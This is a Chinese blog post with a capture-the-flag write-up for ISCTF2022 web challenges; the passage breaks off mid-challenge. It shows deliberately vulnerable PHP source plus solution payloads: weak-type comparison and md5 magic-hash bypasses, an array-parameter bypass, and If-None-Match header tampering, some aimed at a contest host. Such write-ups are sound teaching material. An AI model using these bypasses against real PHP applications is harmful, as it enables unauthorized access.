<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ISCTF2022  web  wp | Chen</title><meta name="keywords" content="CTF,刷题,WEB"><meta name="author" content="By Chen"><meta name="copyright" content="By Chen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="EASY-PHP01get传参   ?hint &lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;title&gt;web签到&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;!--给">
<meta property="og:type" content="article">
<meta property="og:title" content="ISCTF2022  web  wp">
<meta property="og:url" content="https://www.chenyxy.ltd/archives/37243.html">
<meta property="og:site_name" content="Chen">
<meta property="og:description" content="EASY-PHP01get传参   ?hint &lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;title&gt;web签到&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;!--给">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667780403471-660c42f3-0748-4739-9f22-e325d89e002a.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=710&id=u7a046841&margin=%5Bobject%20Object%5D&name=image.png&originHeight=887&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22378&status=done&style=none&taskId=u6579d803-459c-40bd-ba32-0cdf73640d5&title=&width=822.4">
<meta property="article:published_time" content="2022-11-08T05:05:21.822Z">
<meta property="article:modified_time" content="2022-11-08T05:05:44.113Z">
<meta property="article:author" content="By Chen">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="刷题">
<meta property="article:tag" content="WEB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667780403471-660c42f3-0748-4739-9f22-e325d89e002a.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=710&id=u7a046841&margin=%5Bobject%20Object%5D&name=image.png&originHeight=887&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22378&status=done&style=none&taskId=u6579d803-459c-40bd-ba32-0cdf73640d5&title=&width=822.4"><link rel="shortcut icon" href="/img/dog.png"><link rel="canonical" href="https://www.chenyxy.ltd/archives/37243"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-AuMEp5y68M"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":50},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: By Chen","link":"链接: ","source":"来源: Chen","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ISCTF2022  web  wp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-08 13:05:44'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><div class="aplayer" data-id="2693598459" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@1.2.0/dist/Meting.min.js"></script><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/./img/tx.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.nlark.com/yuque/0/2022/png/25610059/1667780403471-660c42f3-0748-4739-9f22-e325d89e002a.png#clientId=uf7071d46-b4c1-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=710&amp;id=u7a046841&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=887&amp;originWidth=1028&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=22378&amp;status=done&amp;style=none&amp;taskId=u6579d803-459c-40bd-ba32-0cdf73640d5&amp;title=&amp;width=822.4')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Chen</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ISCTF2022  web  wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-08T05:05:21.822Z" title="发表于 2022-11-08 13:05:21">2022-11-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-08T05:05:44.113Z" title="更新于 2022-11-08 13:05:44">2022-11-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ISCTF2022  web  wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="EASY-PHP01"><a href="#EASY-PHP01" class="headerlink" title="EASY-PHP01"></a>EASY-PHP01</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667780382844-5e43bd8f-2ab8-4c16-b420-080a6506b9b4.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=565&id=ueecc4f7e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=706&originWidth=601&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44220&status=done&style=none&taskId=ucc7e7035-89da-485e-92e7-05d7e21b04f&title=&width=480.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667780403471-660c42f3-0748-4739-9f22-e325d89e002a.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=710&id=u7a046841&margin=%5Bobject%20Object%5D&name=image.png&originHeight=887&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22378&status=done&style=none&taskId=u6579d803-459c-40bd-ba32-0cdf73640d5&title=&width=822.4" alt="image.png"><br>get传参   <strong>?hint</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;web签到&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--给我一个hint，我给你一个hint--&gt;</span><br><span class="line">&lt;!--?hint --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag114514.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$ISCTF</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ISCTF</span> == <span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ISCTF</span> === <span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;好臭啊&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;= == === != !==&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;什么是POST？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; 什么是GET？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">什么是POST？</span><br></pre></td></tr></table></figure>
<p>弱类型比较绕过<br>POST:      <strong>ISCTF&#x3D;114514a</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667780699099-f441cebe-ef0e-44e5-a663-c3bffe105ece.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=311&id=u58cc2d75&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=869&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35525&status=done&style=none&taskId=ud98e8f0f-6962-48e6-8d18-e97ef24fb85&title=&width=695.2" alt="image.png"></p>
<h2 id="EASY-PHP02"><a href="#EASY-PHP02" class="headerlink" title="EASY-PHP02"></a>EASY-PHP02</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667780771254-1aa327a5-e9f2-4eb5-afa8-2d3fb1dbab8b.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=557&id=u32fa81aa&margin=%5Bobject%20Object%5D&name=image.png&originHeight=696&originWidth=599&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46341&status=done&style=none&taskId=u225b29b1-faac-41d0-aa22-f4c4e7f0f62&title=&width=479.2" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;need_time_to_change&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$YOUR_NAME</span> = <span class="variable">$_GET</span>[<span class="string">&quot;NAME&quot;</span>];</span><br><span class="line"><span class="variable">$GET1</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET1&quot;</span>];</span><br><span class="line"><span class="variable">$GET2</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET2&quot;</span>];</span><br><span class="line"><span class="variable">$POST1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>];</span><br><span class="line"><span class="variable">$POST2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$YOUR_NAME</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,请开始你的答题。&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;做题前请告诉我你是小蓝鲨吗？&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;小蓝鲨成功一半&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;前面的出来了吗？&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;答案就在眼前？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag666</span> = <span class="variable">$f1</span>.<span class="variable">$Ag</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag666</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">做题前请告诉我你是小蓝鲨吗？</span><br></pre></td></tr></table></figure>
<p>先传入your name进入下一个判断<br>P0ST1不等于P0ST2，但是P0ST1等于P0ST2的md5值,这是md5的弱碰撞<br>GET1过滤了纯数字，用字母绕过，GET2大于678，不能为数字，数组绕过<br>构造payload：<br>GET:    <a target="_blank" rel="noopener external nofollow noreferrer" href="http://120.79.18.34:20120/?NAME=111&P0ST1=0&P0ST2=s1502113478a">http://120.79.18.34:20120/?NAME=111&P0ST1=0&P0ST2=s1502113478a</a><br>POST:   GET1&#x3D;a&amp;GET2[]&#x3D;690<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667781770222-2706bf9f-88cf-4df2-809d-04c23ab91146.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=421&id=udeb9fa8e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=526&originWidth=1266&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64203&status=done&style=none&taskId=ub796a455-fe58-4fe1-b0f6-fccd1dfc36b&title=&width=1012.8" alt="image.png"><br>前半段是hex解码   ISCTF{0d4c<br>后半段是base64解码，再Unicode解码    6e9a-51a9-45bf-8a6d-513cdf7b530c}</p>
<h2 id="FakeWeb"><a href="#FakeWeb" class="headerlink" title="FakeWeb"></a>FakeWeb</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667782596460-11342664-7045-4343-a9e4-60d9935071ec.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=565&id=u732e9c1d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=706&originWidth=596&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45276&status=done&style=none&taskId=ucf192dcb-e785-4501-aeba-dbba858e96d&title=&width=476.8" alt="image.png"><br>burpsuite抓包<br>发现跳转页面<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667783774953-44258809-f49a-4d66-966a-4a140d5a50eb.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=169&id=ub128b8ee&margin=%5Bobject%20Object%5D&name=image.png&originHeight=211&originWidth=968&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55745&status=done&style=none&taskId=u37fff34c-28d6-43b7-9076-b800c826cdc&title=&width=774.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667783734007-8cd5b9f9-4972-44c9-bb61-fa0714715b27.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=240&id=u7edaca09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=300&originWidth=1088&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34055&status=done&style=none&taskId=u89e73a4b-2a68-4cd6-9223-6f139b69655&title=&width=870.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667783835714-4c489646-d75d-4aa8-a926-404be01cb038.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=420&id=ub9974175&margin=%5Bobject%20Object%5D&name=image.png&originHeight=525&originWidth=1204&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72510&status=done&style=none&taskId=ued23171b-c027-4a48-98ff-9b1bd44d2f3&title=&width=963.2" alt="image.png"><br>经过查阅资料，发现If-None-Match和ETag是解题关键点</p>
<blockquote>
<p>当浏览器请求服务器的某项资源(A)时, 服务器根据A算出一个哈希值(3f80f-1b6-3e1cb03b)并通过 ETag 返回给浏览器，浏览器把”3f80f-1b6-3e1cb03b” 和 A 同时缓存在本地，当下次再次向服务器请求A时，会通过类似 If-None-Match: “3f80f-1b6-3e1cb03b” 的请求头把ETag发送给服务器，服务器再次计算A的哈希值并和浏览器返回的值做比较，如果发现A发生了变化就把A返回给浏览器(200)，如果发现A没有变化就给浏览器返回一个304未修改。这样通过控制浏览器端的缓存，可以节省服务器的带宽，因为服务器不需要每次都把全量数据返回给客户端。<br>  聪明的服务器开发者会把ETags和GET请求的“If-None-Match”头一起使用，这样可利用客户端（例如浏览器）的缓存。因为服务器首先产生ETag，服务器可在稍后使用它来判断页面是否已经被修改。本质上，客户端通过将该记号传回服务器要求服务器验证其（客户端）缓存。<br>     其过程如下：<br>     1. 客户端请求一个页面（A）。 服务器返回页面A，并在给A加上一个ETag。 客户端展现该页面，并将页面连同ETag一起缓存。         2. 客户再次请求页面A，并将上次请求时服务器返回的ETag一起传递给服务器。<br>     3. 服务器检查该ETag，并判断出该页面自上次客户端请求之后还未被修改，直接返回响应304（未修改——Not Modified）和一<br>        个空的响应体。</p>
</blockquote>
<p>就是说要If-None-Match和ETag的值不相等才会返回一个新的页面，更改If-None-Match的值，然后进行发包<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667784067589-a8b94444-7a78-499a-83d4-66360f2ceee5.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=382&id=u86bbc6d2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=477&originWidth=1135&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75638&status=done&style=none&taskId=ue80c9f36-ee5d-4c6d-a009-f27d5c6f5d8&title=&width=908" alt="image.png"></p>
<h2 id="simplephp"><a href="#simplephp" class="headerlink" title="simplephp"></a>simplephp</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667784113069-3baf595f-3691-4aac-a6f3-95819a940a9f.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=552&id=ua92712fc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=690&originWidth=619&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43875&status=done&style=none&taskId=u089db02f-9996-4b4c-9a70-108be43bd30&title=&width=495.2" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;#\\\\\\\\/Ilikeisctf#&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good try!&quot;</span>;</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span 